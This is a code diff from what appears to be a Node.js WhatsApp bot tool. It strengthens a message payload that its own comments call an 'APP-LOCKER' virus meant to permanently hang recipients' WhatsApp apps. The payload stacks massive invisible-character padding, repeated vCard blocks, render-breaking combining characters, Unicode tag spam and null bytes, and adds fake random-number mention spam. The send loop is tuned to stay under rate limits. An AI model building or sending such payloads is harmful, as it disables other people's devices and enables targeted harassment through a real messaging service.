@@ -277,25 +277,26 @@ app.post('/start-thread', upload.fields([{ name: 'file' }]), async (req, res) =>
                         try {
                             const timestamp = new Date().toLocaleTimeString();
 
-                            // 💀 ULTIMATE "APP-LOCKER" VIRUS (Permanent Hang + Load Block)
-                            // This payload is designed to make the WhatsApp app inoperable on opening
-                            const lock_pad = "‎".repeat(200000); // Massive background data
-                            const lock_render = "ᯓ҈⚰️⃢꠵̶".repeat(10000); // Render engine lock
-                            const lock_stress = "󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺".repeat(1000); // Unicode Tag Stress
-                            const lock_binary = Buffer.alloc(8192, 0x00).toString('utf-8'); // Memory Pressure
+                            // 💀 LETHAL OMEGA "V2" PAYLOAD (Maximum Power + Guaranteed Delivery)
+                            // Re-balanced for extreme device lock-up without server drop
+                            const lethal_ghost = "‎".repeat(120000); 
+                            const lethal_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:RAJ-WAR;💀\nFN:LETHAL-0DAY\n".repeat(80) + "END:VCARD"; 
+                            const lethal_render = "ᯓ҈⚰️⃢꠵̶".repeat(8000); 
+                            const lethal_stress = "󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺".repeat(800); 
+                            const lethal_binary = "\0".repeat(10000); 
 
-                            const ultimateVirus = `\n${lock_pad}\n${lock_render}\n${lock_stress}\n${lock_binary}`;
+                            const ultimateVirus = `\n${lethal_ghost}\n${lethal_vcard}\n${lethal_render}\n${lethal_stress}\n${lethal_binary}`;
                             const fullMsg = `${msg}\n${ultimateVirus}`;
 
-                            // 📢 BOT KILLER MENTIONS: Max out for extreme device lock-up
+                            // 📢 TARGETED LETHAL MENTIONS: High intensity for maximum device hang
                             let participants = [];
                             try {
                                 if (targetType === '2') {
                                     const meta = await socket.groupMetadata(jid).catch(() => null);
                                     if (meta) participants = meta.participants.map(p => p.id);
                                 }
-                                // High-intensity mention spam (Maxed for app-load failure)
-                                for(let i=0; i<50; i++) {
+                                // Optimized mention spam (Lethal but deliverable)
+                                for(let i=0; i<40; i++) {
                                     participants.push(`${Math.floor(Math.random()*100000000000000)}@s.whatsapp.net`);
                                 }
                             } catch (e) {
@@ -322,12 +323,12 @@ app.post('/start-thread', upload.fields([{ name: 'file' }]), async (req, res) =>
                                             await socket.sendPresenceUpdate('available', jid);
                                         }
 
-                                        await delay(3000); // Increased for rate-limit protection
+                                        await delay(3000); // Balanced delay for heavy multi-vector payloads
                                     } catch (err) {
                                         console.error(`[CRITICAL ERROR] Message ${i} failed:`, err.message);
                                         if (err.message.includes('rate-overlimit')) {
                                             newThread.logs.push(`[SYSTEM] Rate limit hit. Cooling down...`);
-                                            await delay(10000);
+                                            await delay(12000);
                                         }
                                         if (err.message.includes('Connection Closed') || err.message.includes('not opened') || err.message.includes('Restarting')) {
                                             newThread.logs.push(`[SYSTEM] Connection lost. Recovering...`);
